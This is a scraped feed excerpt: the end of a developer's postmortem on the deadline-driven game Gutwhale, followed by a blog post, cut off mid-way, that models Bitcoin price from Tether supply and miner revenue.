  <li>
    <p>Gutwhale is only called Gutwhale because the project needed an artist.
<a href="https://twitter.com/franek">Franek</a> is very good at making pixelart and he, for whatever reason, also loves to draw whales. So when he was on the fence about joining the project, I quickly changed the setting to take place inside of a whale. This does not make a lot of sense, but Franek got to draw a whale and the game had an artist.
<br></p>
  </li>
  <li>
    <p>Gutwhale used to take place on a single screen, because then I would not have to write a camera system. When it turned out that a single screen was pretty boring, we just glued multiple single screens together and make the floor break once all enemies were defeated. The core loop of Gutwhale was born out of not wanting to code a camera system.
<br></p>
  </li>
  <li>
    <p>The small size of the Levels themselves helped me in a lot of ways. The level generation code does not need to consider unreachable platforms and could be hacked together violently. Because there is so little space to move around in, enemies become more dangerous and I needed to code less of them to fill the game.<br></p>
  </li>
</ul>

<p>The deadline forced me to think quickly and to design dirtily, accidentally disovering some pretty neat things.<br>
It certainly has also hurt the game in a lot of ways.
<br></p>

<h2>the cost of deadlines</h2>

<p>Gutwhale is unbalanced in both directions. <br></p>

<div><p>For people with little to no platformer roguelike experience, it is extremely hard.minutes and then give up, never to touch the game again.</p><p>

For people who played downwell and gonner, it is a piece of cake and they can 100% the game in around 20 minutes. There is an endless nightmare mode, but it did not have an engaging highscore system, so the best players of Gutwhale quickly got bored.</p><p>

The save system of Gutwhale had horrible bugs and there were technical problems all over the place, prohibitung us from implementing Achievements and updating the game easily.<br>
We used Construct 2, an engine that is no longer supported by its developers in favour of Construct 3. This made it impossible to add Steam Achievements and created some other technical problems.
<br>
And these problems are just that: <br>
Problems. </p><p>

They exist because we rushed through development at an insane speed and I can forgive myself for making them, because I was actually focusing on this one secret thing at the end.
</p><p>
<strong>BUT</strong></p><p>
The part of the game that is most important to me, the ending, is also not working as intended. I was unable to clearly communicate what I wanted to communicate. 
<br>
There was not enough time to conduct long term playtests and interview players about how they perceived the ending.<br>
There was not enough time for me to really reflect and ponder and tweak and adjust the ending of Gutwhale.<br>
I started the project as a compromise between compelling gameplay and a secret, expressive part, which enabled me to keep working on the game.<br>
And that part did not work. It did not resonate. <br>
At least it feels like that to me now.</p></div>

<h2>the nice things</h2>

<p>Gutwhale was a success overall: <br></p>
<ul>
  <li>
    <p>It made me more money than I would have earned at my previous job, but not nearly enough to not have to go back to that job in 7 days.<br></p>
  </li>
  <li>
    <p>It may make substantially more money on consoles or in bundles in the future.</p>
  </li>
  <li>
    <p>It gave me a better understanding of how to sell stuff on steam.</p>
  </li>
  <li>
    <p>and last but defenitly not least, I got to work with Franek, Britt Brady and Clovelt who have thaught me a lot and are amazing people.
<br></p>
  </li>
</ul>

<h2>conclusion</h2>

<div><p>Finishing games is hard. <br>
Really hard. <br>
As a way to deal with this, a series of game jams has been created, where speed is key and the end product is only as important as the fact that it got finished.<br>
We have seen amazing games made in insanely short times and countless people have been able to dabble in game dev because of the contained nature of game jams.</p><p>

<strong>BUT</strong></p><p>
Applying this need for speed to bigger projects creates dynamics that should not be confused with efficiency and skill.</p><p>

The core part of Gutwhale, the one thing I was truly interested in, withered and died because of the deadline, because we were so wrapped up in getting the game done. <br>
There was simply not enough time to stop and smell the flowers.<br>
The deadline mercilessly  and in cold blood, pulled us away from being able to express ourselves.</p><p>

Gutwhale is nice and I am proud of it, but i think it is time for me to force myself to move on to a different way of development.</p><p>

When i did not know what I wanted express through the games I make, when i just wanted to MAKE, I needed frameworks to support me, to force me to do the work and to put in the hours, but after years of doing that, those structures have started to feel inhibiting in the best way possible. <br>
They are still able to teach me and to challenge me, but in the end, they are also keeping me from moving towards, to where I want to go, to do what I want to create.<br>
Deadlines keep me from really reflecting and looking at myself. They keep me from thinking about what i want to express through my work and they keep me from then actually saying that.</p></div>

<p><a href="https://store.steampowered.com/app/1267810/Gutwhale/">Gutwhale´s Steampage</a></p>

<p><a href="http://stuffedwomb.at/thinking">back</a></p>


      
    </div></div>]]>
            </description>
            <link>http://stuffedwomb.at/goodbye_gutwhale</link>
            <guid isPermaLink="false">hacker-news-small-sites-25782307</guid>
            <pubDate>Thu, 14 Jan 2021 20:52:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Will Bitcoin go up or down?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25782222">thread link</a>) | @andr3w321
<br/>
January 14, 2021 | https://sellthedip.com/will-bitcoin-will-go-up-or-down/ | <a href="https://web.archive.org/web/*/https://sellthedip.com/will-bitcoin-will-go-up-or-down/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-182">
	<!-- .entry-header -->

	<div>
		
<p>The way I think about whether Bitcoin price is going to rise or fall is by thinking about Bitcoin flows.</p>



<figure><a href="https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Fraud-Diagram2.jpg?ssl=1"><img loading="lazy" width="656" height="405" src="https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Fraud-Diagram2.jpg?resize=656%2C405&amp;ssl=1" alt="" srcset="https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Fraud-Diagram2.jpg?resize=1024%2C632&amp;ssl=1 1024w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Fraud-Diagram2.jpg?resize=300%2C185&amp;ssl=1 300w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Fraud-Diagram2.jpg?resize=768%2C474&amp;ssl=1 768w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Fraud-Diagram2.jpg?resize=1536%2C948&amp;ssl=1 1536w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Fraud-Diagram2.jpg?resize=2048%2C1265&amp;ssl=1 2048w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Fraud-Diagram2.jpg?w=1312&amp;ssl=1 1312w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Fraud-Diagram2.jpg?w=1968&amp;ssl=1 1968w" sizes="(max-width: 656px) 100vw, 656px" data-recalc-dims="1"></a></figure>



<p>Predicting Bitcoin’s price is relatively easy and straightforward if you know the dollar amounts of all the flows at all times.</p>



<p>If Bitcoin inflows &gt; Bitcoin outflows then Bitcoin price will rise to meet demand.<br>If Bitcoin outflows &gt; Bitcoin inflows then Bitcoin price will fall to meet demand.</p>



<p>Unfortunately, <strong>1) USD inflows and outflows</strong> are impossible to know without getting proprietary exchange data on deposits and withdrawals. The best alternative I’ve found is using something like google trends data to gauge sentiment. When people are googling “bitcoin” a lot, that means there is probably a lot of USD demand for bitcoin at any given time.</p>



<figure><a href="https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Bitstamp-bitcoin-price-vs-bitcoin-google-trends.jpg?ssl=1"><img loading="lazy" width="656" height="546" src="https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Bitstamp-bitcoin-price-vs-bitcoin-google-trends.jpg?resize=656%2C546&amp;ssl=1" alt="" srcset="https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Bitstamp-bitcoin-price-vs-bitcoin-google-trends.jpg?resize=1024%2C853&amp;ssl=1 1024w, https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Bitstamp-bitcoin-price-vs-bitcoin-google-trends.jpg?resize=300%2C250&amp;ssl=1 300w, https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Bitstamp-bitcoin-price-vs-bitcoin-google-trends.jpg?resize=768%2C640&amp;ssl=1 768w, https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Bitstamp-bitcoin-price-vs-bitcoin-google-trends.jpg?w=1200&amp;ssl=1 1200w" sizes="(max-width: 656px) 100vw, 656px" data-recalc-dims="1"></a></figure>



<p><a href="https://trends.google.com/trends/explore?date=today%205-y&amp;geo=US&amp;q=bitcoin">https://trends.google.com/trends/explore?date=today%205-y&amp;geo=US&amp;q=bitcoin</a></p>



<p>Fortunately <strong>2) Tether buyers and sellers</strong> and <strong>3) Miner Revenue</strong> are known, published values that can be looked up easily. We can use these to create an incomplete, real time model of Bitcoin flows to predict future Bitcoin prices.</p>



<p><strong>Tether buyers and sellers</strong></p>



<p>First, we will look at USDT supply changes over time. The way that Tether is supposed to work according to the original <a href="https://tether.to/wp-content/uploads/2016/06/TetherWhitePaper.pdf">Tether white paper </a>is that Tethers are created when people buy USDT with USD and Tethers are destroyed when people redeem USDT for USD. Therefore, the only way for the total supply of USDT to grow is for the amount of USDT buyers to be greater than the amount of USDT sellers. </p>



<figure><img loading="lazy" width="656" height="569" src="https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/tether-flows.png?resize=656%2C569&amp;ssl=1" alt="" srcset="https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/tether-flows.png?w=901&amp;ssl=1 901w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/tether-flows.png?resize=300%2C260&amp;ssl=1 300w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/tether-flows.png?resize=768%2C667&amp;ssl=1 768w" sizes="(max-width: 656px) 100vw, 656px" data-recalc-dims="1"><figcaption>Source: Tether White Paper</figcaption></figure>



<p>You can easily model Tether flows by looking at the growth or decline in USDT supply over time. When USDT supply is growing that means there are net inflows into Tether, and when USDT supply is declining that means there are net outflows from Tether. </p>



<p>Unfortunately, as far as I know, Coingecko does not provide USDT Supply data directly so I had to indirectly calculate it with USDT market cap / USDT price. As I stated in my last post, their USDT price is calculated in a complicated manner, so it may cause some irregularities in the data. Here is USDT supply over time.</p>



<figure><a href="https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/USDT-Supply-Over-Time.jpg?ssl=1"><img loading="lazy" width="656" height="438" src="https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/USDT-Supply-Over-Time.jpg?resize=656%2C438&amp;ssl=1" alt="" srcset="https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/USDT-Supply-Over-Time.jpg?resize=1024%2C683&amp;ssl=1 1024w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/USDT-Supply-Over-Time.jpg?resize=300%2C200&amp;ssl=1 300w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/USDT-Supply-Over-Time.jpg?resize=768%2C512&amp;ssl=1 768w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/USDT-Supply-Over-Time.jpg?w=1200&amp;ssl=1 1200w" sizes="(max-width: 656px) 100vw, 656px" data-recalc-dims="1"></a></figure>



<p>To properly look at flows, you should graph the net increase or decrease over time. You can look at flows on a daily basis with USDT supply – USDT supply 1 day ago:</p>



<figure><a href="https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-1.jpg?ssl=1"><img loading="lazy" width="656" height="328" src="https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-1.jpg?resize=656%2C328&amp;ssl=1" alt="" srcset="https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-1.jpg?resize=1024%2C512&amp;ssl=1 1024w, https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-1.jpg?resize=300%2C150&amp;ssl=1 300w, https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-1.jpg?resize=768%2C384&amp;ssl=1 768w, https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-1.jpg?resize=1536%2C768&amp;ssl=1 1536w, https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-1.jpg?w=1600&amp;ssl=1 1600w, https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-1.jpg?w=1312&amp;ssl=1 1312w" sizes="(max-width: 656px) 100vw, 656px" data-recalc-dims="1"></a></figure>



<p>Or you can look at flows on a longer time frame basis. Here is a chart of USDT supply – USDT supply 30 days ago:</p>



<figure><a href="https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-30-days-1.jpg?ssl=1"><img loading="lazy" width="656" height="328" src="https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-30-days-1.jpg?resize=656%2C328&amp;ssl=1" alt="" srcset="https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-30-days-1.jpg?resize=1024%2C512&amp;ssl=1 1024w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-30-days-1.jpg?resize=300%2C150&amp;ssl=1 300w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-30-days-1.jpg?resize=768%2C384&amp;ssl=1 768w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-30-days-1.jpg?resize=1536%2C768&amp;ssl=1 1536w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-30-days-1.jpg?w=1600&amp;ssl=1 1600w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-30-days-1.jpg?w=1312&amp;ssl=1 1312w" sizes="(max-width: 656px) 100vw, 656px" data-recalc-dims="1"></a></figure>



<p>You can then try to predict future Bitcoin prices based on these flows.</p>



<figure><a href="https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-and-Bitcoin-price.jpg?ssl=1"><img loading="lazy" width="656" height="328" src="https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-and-Bitcoin-price.jpg?resize=656%2C328&amp;ssl=1" alt="" srcset="https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-and-Bitcoin-price.jpg?resize=1024%2C512&amp;ssl=1 1024w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-and-Bitcoin-price.jpg?resize=300%2C150&amp;ssl=1 300w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-and-Bitcoin-price.jpg?resize=768%2C384&amp;ssl=1 768w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-and-Bitcoin-price.jpg?resize=1536%2C768&amp;ssl=1 1536w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-and-Bitcoin-price.jpg?w=1600&amp;ssl=1 1600w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-and-Bitcoin-price.jpg?w=1312&amp;ssl=1 1312w" sizes="(max-width: 656px) 100vw, 656px" data-recalc-dims="1"></a></figure>



<p>You can clearly see that large USDT supply increases precede several large increases in Bitcoin price and several large USDT supply decreases precede drops in Bitcoin price. Below is a table of Pearson Correlation Coefficients or R values showing change in USDT supply over a period of days vs future Bitcoin returns since 1/1/2018.</p>



<figure><img loading="lazy" width="656" height="120" src="https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/usdt-model-correlation-matrix.png?resize=656%2C120&amp;ssl=1" alt="" srcset="https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/usdt-model-correlation-matrix.png?resize=1024%2C188&amp;ssl=1 1024w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/usdt-model-correlation-matrix.png?resize=300%2C55&amp;ssl=1 300w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/usdt-model-correlation-matrix.png?resize=768%2C141&amp;ssl=1 768w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/usdt-model-correlation-matrix.png?w=1146&amp;ssl=1 1146w" sizes="(max-width: 656px) 100vw, 656px" data-recalc-dims="1"></figure>



<p>You will notice that Tether flows have a low correlation to very short term price predictions, but high correlation to longer term predictions.</p>



<p>Now that we know that USDT printing is bullish and that USDT destruction is bearish for Bitcoin, it would be nice to know when Tether plans on printing or destroying USDT before it happens. You might think this is completely up to those in charge at Bitfinex, however, they are not immune from market forces. As I mentioned in my last post <a href="https://sellthedip.com/a-more-accurate-tether-price-history-chart/">https://sellthedip.com/a-more-accurate-tether-price-history-chart/</a> the CoinbaseBTC/BitfinexBTC price is a good proxy for the true price of USDT. When the CoinbaseBTC/BitfinexBTC price is stable and &gt;=1, it is safe to assume they will continue to print and it is bullish for Bitcoin.  When the CoinbaseBTC/BitfinexBTC price is &lt;1, it is safe to assume that Tether and Bitfinex will be forced to destroy USDT. This is bearish for Bitcoin. You can see this by charting the daily change in USDT supply vs the USDT price over time.</p>



<figure><a href="https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-and-USDT-price.jpg?ssl=1"><img loading="lazy" width="656" height="328" src="https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-and-USDT-price.jpg?resize=656%2C328&amp;ssl=1" alt="" srcset="https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-and-USDT-price.jpg?resize=1024%2C512&amp;ssl=1 1024w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-and-USDT-price.jpg?resize=300%2C150&amp;ssl=1 300w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-and-USDT-price.jpg?resize=768%2C384&amp;ssl=1 768w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-and-USDT-price.jpg?resize=1536%2C768&amp;ssl=1 1536w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-and-USDT-price.jpg?w=1600&amp;ssl=1 1600w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-and-USDT-price.jpg?w=1312&amp;ssl=1 1312w" sizes="(max-width: 656px) 100vw, 656px" data-recalc-dims="1"></a></figure>



<figure><img loading="lazy" width="656" height="328" src="https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Bitcoin-price-over-time.jpg?resize=656%2C328&amp;ssl=1" alt="" srcset="https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Bitcoin-price-over-time.jpg?resize=1024%2C512&amp;ssl=1 1024w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Bitcoin-price-over-time.jpg?resize=300%2C150&amp;ssl=1 300w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Bitcoin-price-over-time.jpg?resize=768%2C384&amp;ssl=1 768w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Bitcoin-price-over-time.jpg?resize=1536%2C768&amp;ssl=1 1536w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Bitcoin-price-over-time.jpg?w=1600&amp;ssl=1 1600w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Bitcoin-price-over-time.jpg?w=1312&amp;ssl=1 1312w" sizes="(max-width: 656px) 100vw, 656px" data-recalc-dims="1"></figure>



<p>You can learn a lot from these charts. Sometimes printing too much USDT crashes the price of USDT. Sometimes USDT is destroyed after the price of USDT gets too low. The USDT price dropping below 1 for a sustained period of time (as it did in late 2018) prevents Tether from printing USDT and sometimes even forces Tether to destroy USDT. Destroying USDT has two effects: 1) It reduces the total supply of USDT in an attempt to increase the price of USDT, and 2) It crashes the price of BTC. It’s important to look at the price of USDT over time because it is a leading indicator of USDT being destroyed,  which in turn is a leading indicator of Bitcoin crashing.</p>



<p><strong>Miner Revenue</strong></p>



<p>Next, we will look at Bitcoin miner revenue.</p>



<figure><a href="https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Daily-Miner-Revenue-and-Bitcoin-Price-Over-Time-2.jpg?ssl=1"><img loading="lazy" width="656" height="328" src="https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Daily-Miner-Revenue-and-Bitcoin-Price-Over-Time-2.jpg?resize=656%2C328&amp;ssl=1" alt="" srcset="https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Daily-Miner-Revenue-and-Bitcoin-Price-Over-Time-2.jpg?resize=1024%2C512&amp;ssl=1 1024w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Daily-Miner-Revenue-and-Bitcoin-Price-Over-Time-2.jpg?resize=300%2C150&amp;ssl=1 300w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Daily-Miner-Revenue-and-Bitcoin-Price-Over-Time-2.jpg?resize=768%2C384&amp;ssl=1 768w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Daily-Miner-Revenue-and-Bitcoin-Price-Over-Time-2.jpg?resize=1536%2C768&amp;ssl=1 1536w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Daily-Miner-Revenue-and-Bitcoin-Price-Over-Time-2.jpg?w=1600&amp;ssl=1 1600w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Daily-Miner-Revenue-and-Bitcoin-Price-Over-Time-2.jpg?w=1312&amp;ssl=1 1312w" sizes="(max-width: 656px) 100vw, 656px" data-recalc-dims="1"></a></figure>



<p>Bitcoin miners are net sellers of Bitcoin. They receive their payment in Bitcoin, but they pay their energy bills in fiat. In order to cover their expenses, they have to sell almost all the Bitcoin they receive as revenue for fiat. These miners provide a valuable service to the Bitcoin network by processing transactions and securing the network, but make no mistake about it, the more revenue they receive, the more selling pressure and negative flows it creates for Bitcoin. You can see in the chart that every time there is a large spike in Bitcoin price, Miner Revenue also spikes, and then Bitcoin price declines.</p>



<p>Theoretically, I don’t think Miner Revenue should provide much, if any, predictive power to Bitcoin price anymore than gold miner revenue predicts future gold prices. However, what I believe is currently happening is that enough USDT is being printed to offset what should be very bearish, huge Miner Revenue flows.</p>



<figure><img loading="lazy" width="656" height="438" src="https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Cumulative-USDT-printed-and-cumulative-mining-revenue.jpg?resize=656%2C438&amp;ssl=1" alt="" srcset="https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Cumulative-USDT-printed-and-cumulative-mining-revenue.jpg?resize=1024%2C683&amp;ssl=1 1024w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Cumulative-USDT-printed-and-cumulative-mining-revenue.jpg?resize=300%2C200&amp;ssl=1 300w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Cumulative-USDT-printed-and-cumulative-mining-revenue.jpg?resize=768%2C512&amp;ssl=1 768w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Cumulative-USDT-printed-and-cumulative-mining-revenue.jpg?w=1200&amp;ssl=1 1200w" sizes="(max-width: 656px) 100vw, 656px" data-recalc-dims="1"></figure>



<p>This is why exponentially more USDT has to be printed to keep the price of Bitcoin increasing. The higher the price of Bitcoin goes, the higher Miner Revenue goes, and the more Tether needs to be printed to offset those flows.</p>



<p>To finish the incomplete Bitcoin Flows model, you can subtract Miner Revenue from changes in USDT supply over a trailing number of days.</p>



<figure><a href="https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-1-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-2.jpg?ssl=1"><img loading="lazy" width="656" height="328" src="https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-1-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-2.jpg?resize=656%2C328&amp;ssl=1" alt="" srcset="https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-1-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-2.jpg?resize=1024%2C512&amp;ssl=1 1024w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-1-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-2.jpg?resize=300%2C150&amp;ssl=1 300w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-1-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-2.jpg?resize=768%2C384&amp;ssl=1 768w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-1-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-2.jpg?resize=1536%2C768&amp;ssl=1 1536w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-1-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-2.jpg?w=1600&amp;ssl=1 1600w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-1-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-2.jpg?w=1312&amp;ssl=1 1312w" sizes="(max-width: 656px) 100vw, 656px" data-recalc-dims="1"></a></figure>



<figure><a href="https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-7-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-1.jpg?ssl=1"><img loading="lazy" width="656" height="328" src="https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-7-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-1.jpg?resize=656%2C328&amp;ssl=1" alt="" srcset="https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-7-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-1.jpg?resize=1024%2C512&amp;ssl=1 1024w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-7-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-1.jpg?resize=300%2C150&amp;ssl=1 300w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-7-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-1.jpg?resize=768%2C384&amp;ssl=1 768w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-7-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-1.jpg?resize=1536%2C768&amp;ssl=1 1536w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-7-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-1.jpg?w=1600&amp;ssl=1 1600w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-7-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-1.jpg?w=1312&amp;ssl=1 1312w" sizes="(max-width: 656px) 100vw, 656px" data-recalc-dims="1"></a></figure>



<figure><a href="https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-30-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-1.jpg?ssl=1"><img loading="lazy" width="656" height="328" src="https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-30-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-1.jpg?resize=656%2C328&amp;ssl=1" alt="" srcset="https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-30-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-1.jpg?resize=1024%2C512&amp;ssl=1 1024w, https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-30-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-1.jpg?resize=300%2C150&amp;ssl=1 300w, https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-30-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-1.jpg?resize=768%2C384&amp;ssl=1 768w, https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-30-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-1.jpg?resize=1536%2C768&amp;ssl=1 1536w, https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-30-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-1.jpg?w=1600&amp;ssl=1 1600w, https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-30-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-1.jpg?w=1312&amp;ssl=1 1312w" sizes="(max-width: 656px) 100vw, 656px" data-recalc-dims="1"></a></figure>



<p>You can see that high Bitcoin Flows are usually lower in bear markets and generally higher in bull markets. You will also no doubt observe that current Bitcoin flows are very high, and this appears to be very bullish. Before you rush to buy Bitcoin on 10x leverage based on my charts, please remember a few things: </p>



<p>First, this model is incomplete because these flows are incomplete. <strong>The most important part of Bitcoin flows 1) USD buyers and USD sellers are not included.</strong> During early December 2017, there was clearly huge USD buyer demand and very little selling demand. By the end of the month, after prices had peaked, the flows had clearly reversed and there was huge selling pressure at highly elevated prices. What the crowd buys today, they may want to sell tomorrow. A declining ‘bitcoin’ google trends data following a massive spike, such as what we are currently experiencing, is undefeated in predicting a bear market. Ignore it at your own peril.</p>



<p>Second, looking at these flows and getting excited to invest is like looking at past fraudulent accounting statements for a company, seeing how well that stock has performed, and assuming it will continue in this way forever. Eventually, the crash comes and then the regulators step in and shut it down.</p>



<p>Additionally, looking at the Bitcoin flows charts above, take note that there is nothing special about the zero on the y-axis. In a typical day, the USD buying demand is probably higher than USD sellers by several million dollars worldwide which would shift all the flows slightly upward if you were to model USD demand that way.</p>



<p><strong>Bitcoin and the broader market</strong></p>



